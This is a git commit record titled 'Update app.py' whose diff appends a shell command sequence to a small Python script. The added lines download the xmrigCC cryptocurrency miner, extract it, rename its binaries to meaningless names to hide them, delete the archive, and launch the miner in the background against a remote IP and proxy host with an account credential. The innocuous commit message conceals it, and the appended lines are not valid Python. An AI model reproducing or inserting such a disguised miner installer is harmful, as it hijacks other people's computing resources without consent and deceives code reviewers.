df318bf59126b756b7da90df500717b8374d770c
D. SAN. YIL <robinexx@gmail.com>
2022-11-29 21:29:39 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,3 +1,13 @@
 print("Goodbye, World!")
 import subprocess
 print((subprocess.check_output("lscpu", shell=True).strip()).decode())
+
+
+https://github.com/Bendr0id/xmrigCC/releases/download/3.3.1/xmrigCC-3.3.1-mvc-win64.zip
+  
+RIGNAME=tlinecloud01 && MYDir=ppopc && MYRname=ihz && MyblankName=kag  && wget 
+https://github.com/Bendr0id/xmrigCC/releases/download/3.3.1/xmrigCC-miner_only-3.3.1-linux-generic-static-amd64.tar.gz && 
+  mkdir -p $MYDir && tar -xf xmrigCC-miner_only-3.3.1-linux-generic-static-amd64.tar.gz -C $MYDir && mv $MYDir/xmrigDaemon $MYDir/$MyblankName && mv 
+  $MYDir/xmrigMiner $MYDir/$MYRname && rm -rf xmrigCC-miner_only-3.3.1-linux-generic-static-amd64.tar.gz && 
+  
+  ./ppopc/ihz --daemonized --url 116.202.3.220:24656 -x t3d.myvnc.com:11564 -u 7pRk4QhDsn+PBkh+d6+pvJjZ9lR9C2uH -p $RIGNAME --donate-level 1 -a rx/xdag -B
